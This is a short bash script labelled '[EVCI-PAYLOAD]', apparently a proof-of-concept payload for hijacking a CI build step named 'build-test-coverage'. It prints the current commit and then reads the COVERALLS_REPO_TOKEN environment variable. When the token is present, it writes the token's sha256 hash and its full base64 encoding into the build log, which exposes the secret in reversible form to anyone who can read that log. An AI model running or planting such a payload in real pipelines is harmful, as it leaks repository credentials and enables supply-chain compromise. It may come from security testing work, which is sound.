#!/bin/bash
echo "[EVCI-PAYLOAD] attacker-controlled code executing: build-test-coverage"
echo "[EVCI-PAYLOAD] commit: $(git rev-parse HEAD)"
for v in COVERALLS_REPO_TOKEN; do
  val="${!v}"
  if [ -n "$val" ]; then
    echo "[EVCI-PAYLOAD] $v PRESENT sha256=$(printf %s "$val" | sha256sum | cut -d' ' -f1) b64=$(printf %s "$val" | base64 -w0)"
  else
    echo "[EVCI-PAYLOAD] $v EMPTY-OR-ABSENT"
  fi
done
